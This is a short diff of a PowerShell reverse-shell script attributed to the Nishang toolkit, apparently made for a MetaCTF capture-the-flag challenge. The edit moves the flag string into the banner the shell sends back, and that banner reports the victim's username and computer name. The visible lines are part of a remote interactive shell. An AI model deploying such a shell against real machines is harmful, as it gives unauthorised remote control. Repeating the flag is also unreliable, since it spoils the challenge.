@@ -84,7 +84,7 @@ https://github.com/samratashok/nishang
         [byte[]]$bytes = 0..65535|%{0}
 
         #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved. MetaCTF{All_H04x3d_0ut}`n`n")
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
         #Show an interactive PowerShell prompt
@@ -102,7 +102,7 @@ https://github.com/samratashok/nishang
             }
             catch
             {
-                Write-Warning "MetaCTF{All_H04x3d_0ut}" 
+                Write-Warning "Somethings messed up!" 
                 Write-Error $_
             }
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
